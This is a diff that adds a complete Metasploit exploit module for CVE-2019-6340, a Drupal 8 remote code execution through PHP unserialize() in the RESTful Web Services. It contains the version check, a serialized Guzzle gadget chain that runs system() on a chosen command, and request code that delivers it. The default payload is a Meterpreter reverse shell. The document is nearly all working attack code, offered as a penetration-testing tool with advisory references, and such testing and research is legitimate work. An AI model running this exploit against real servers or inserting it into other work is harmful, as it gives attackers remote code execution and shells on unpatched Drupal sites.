@@ -1,0 +1,266 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  # NOTE: All (four) Web Services modules need to be enabled
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HTTP::Drupal
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'               => 'Drupal RESTful Web Services unserialize() RCE',
+      'Description'        => %q{
+        This module exploits a PHP unserialize() vulnerability in Drupal RESTful
+        Web Services by sending a crafted request to the /node REST endpoint.
+
+        As per SA-CORE-2019-003, the initial remediation was to disable POST,
+        PATCH, and PUT, but Ambionics discovered that GET was also vulnerable
+        (albeit cached). Cached nodes can be exploited only once.
+
+        Drupal updated SA-CORE-2019-003 with PSA-2019-02-22 to notify users of
+        this alternate vector.
+
+        Drupal < 8.5.11 and < 8.6.10 are vulnerable.
+      },
+      'Author'             => [
+        'Jasper Mattsson', # Discovery
+        'Charles Fol',     # PoC
+        'Rotem Reiss',     # Module
+        'wvu'              # Module
+      ],
+      'References'         => [
+        ['CVE', '2019-6340'],
+        ['URL', 'https://www.drupal.org/sa-core-2019-003'],
+        ['URL', 'https://www.drupal.org/psa-2019-02-22'],
+        ['URL', 'https://www.ambionics.io/blog/drupal8-rce'],
+        ['URL', 'https://github.com/ambionics/phpggc'],
+        ['URL', 'https://twitter.com/jcran/status/1099206271901798400']
+      ],
+      'DisclosureDate'     => '2019-02-20',
+      'License'            => MSF_LICENSE,
+      'Platform'           => ['php', 'unix'],
+      'Arch'               => [ARCH_PHP, ARCH_CMD],
+      'Privileged'         => false,
+      'Targets'            => [
+        ['PHP In-Memory',
+          'Platform'       => 'php',
+          'Arch'           => ARCH_PHP,
+          'Type'           => :php_memory,
+          'Payload'        => {'BadChars' => "'"},
+          'DefaultOptions' => {
+            'PAYLOAD'      => 'php/meterpreter/reverse_tcp'
+          }
+        ],
+        ['Unix In-Memory',
+          'Platform'       => 'unix',
+          'Arch'           => ARCH_CMD,
+          'Type'           => :unix_memory,
+          'DefaultOptions' => {
+            'PAYLOAD'      => 'cmd/unix/generic',
+            'CMD'          => 'id'
+          }
+        ]
+      ],
+      'DefaultTarget'      => 0,
+      'Notes'              => {
+        'Stability'        => [CRASH_SAFE],
+        'SideEffects'      => [IOC_IN_LOGS],
+        'Reliablity'       => [UNRELIABLE_SESSION], # When using the GET method
+        'AKA'              => ['SA-CORE-2019-003']
+      }
+    ))
+
+    register_options([
+      OptEnum.new('METHOD', [true, 'HTTP method to use', 'POST',
+                            ['GET', 'POST', 'PATCH', 'PUT']]),
+      OptInt.new('NODE',    [false, 'Node ID to target with GET method', 1])
+    ])
+
+    register_advanced_options([
+      OptBool.new('ForceExploit', [false, 'Override check result', false])
+    ])
+  end
+
+  def check
+    checkcode = CheckCode::Unknown
+
+    version = drupal_version
+
+    unless version
+      vprint_error('Could not determine Drupal version')
+      return checkcode
+    end
+
+    if version.to_s !~ /^8\b/
+      vprint_error("Drupal #{version} is not supported")
+      return CheckCode::Safe
+    end
+
+    vprint_status("Drupal #{version} targeted at #{full_uri}")
+    checkcode = CheckCode::Detected
+
+    changelog = drupal_changelog(version)
+
+    unless changelog
+      vprint_error('Could not determine Drupal patch level')
+      return checkcode
+    end
+
+    case drupal_patch(changelog, 'SA-CORE-2019-003')
+    when nil
+      vprint_warning('CHANGELOG.txt no longer contains patch level')
+    when true
+      vprint_warning('Drupal appears patched in CHANGELOG.txt')
+      checkcode = CheckCode::Safe
+    when false
+      vprint_good('Drupal appears unpatched in CHANGELOG.txt')
+      checkcode = CheckCode::Appears
+    end
+
+    # Any further with GET and we risk caching the targeted node
+    return checkcode if meth == 'GET'
+
+    # NOTE: Exploiting the vuln will move us from "Safe" to Vulnerable
+    token = Rex::Text.rand_text_alphanumeric(8..42)
+    res   = execute_command("echo #{token}")
+
+    return checkcode unless res
+
+    if res.body.include?(token)
+      vprint_good('Drupal is vulnerable to code execution')
+      checkcode = CheckCode::Vulnerable
+    end
+
+    checkcode
+  end
+
+  def exploit
+    if [CheckCode::Safe, CheckCode::Unknown].include?(check)
+      if datastore['ForceExploit']
+        print_warning('ForceExploit set! Exploiting anyway!')
+      else
+        fail_with(Failure::NotVulnerable, 'Set ForceExploit to override')
+      end
+    end
+
+    if datastore['PAYLOAD'] == 'cmd/unix/generic'
+      print_warning('Enabling DUMP_OUTPUT for cmd/unix/generic')
+      # XXX: Naughty datastore modification
+      datastore['DUMP_OUTPUT'] = true
+    end
+
+    case target['Type']
+    when :php_memory
+      # XXX: This will spawn a *very* obvious process
+      execute_command("php -r '#{payload.encoded}'")
+    when :unix_memory
+      execute_command(payload.encoded)
+    end
+  end
+
+  def execute_command(cmd, opts = {})
+    vprint_status("Executing with system(): #{cmd}")
+
+    # https://en.wikipedia.org/wiki/Hypertext_Application_Language
+    hal_json = JSON.pretty_generate(
+      'link'      => [
+        'value'   => 'link',
+        'options' => phpggc_payload(cmd)
+      ],
+      '_links'    => {
+        'type'    => {
+          'href'  => vhost_uri
+        }
+      }
+    )
+
+    print_status("Sending #{meth} to #{node_uri} with link #{vhost_uri}")
+
+    res = send_request_cgi({
+      'method'   => meth,
+      'uri'      => node_uri,
+      'ctype'    => 'application/hal+json',
+      'vars_get' => {'_format' => 'hal_json'},
+      'data'     => hal_json
+    }, 3.5)
+
+    return unless res
+
+    case res.code
+    # 401 isn't actually a failure when using the POST method
+    when 200, 401
+      print_line(res.body) if datastore['DUMP_OUTPUT']
+      if meth == 'GET'
+        print_warning('If you did not get code execution, try a new node ID')
+      end
+    when 404
+      print_error("#{node_uri} not found")
+    when 405
+      print_error("#{meth} method not allowed")
+    when 422
+      print_error('VHOST may need to be set')
+    when 406
+      print_error('Web Services may not be enabled')
+    else
+      print_error("Unexpected reply: #{res.inspect}")
+    end
+
+    res
+  end
+
+  # phpggc Guzzle/RCE1 system id
+  def phpggc_payload(cmd)
+    (
+      # http://www.phpinternalsbook.com/classes_objects/serialization.html
+      <<~EOF
+        O:24:"GuzzleHttp\\Psr7\\FnStream":2:{
+          s:33:"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods";a:1:{
+            s:5:"close";a:2:{
+              i:0;O:23:"GuzzleHttp\\HandlerStack":3:{
+                s:32:"\u0000GuzzleHttp\\HandlerStack\u0000handler";
+                  s:cmd_len:"cmd";
+                s:30:"\u0000GuzzleHttp\\HandlerStack\u0000stack";
+                  a:1:{i:0;a:1:{i:0;s:6:"system";}}
+                s:31:"\u0000GuzzleHttp\\HandlerStack\u0000cached";
+                  b:0;
+              }
+              i:1;s:7:"resolve";
+            }
+          }
+          s:9:"_fn_close";a:2:{
+            i:0;r:4;
+            i:1;s:7:"resolve";
+          }
+        }
+      EOF
+    ).gsub(/\s+/, '').gsub('cmd_len', cmd.length.to_s).gsub('cmd', cmd)
+  end
+
+  def meth
+    datastore['METHOD'] || 'POST'
+  end
+
+  def node
+    datastore['NODE'] || 1
+  end
+
+  def node_uri
+    if meth == 'GET'
+      normalize_uri(target_uri.path, '/node', node)
+    else
+      normalize_uri(target_uri.path, '/node')
+    end
+  end
+
+  def vhost_uri
+    full_uri(
+      normalize_uri(target_uri.path, '/rest/type/shortcut/default'),
+      vhost_uri: true
+    )
+  end
+
+end
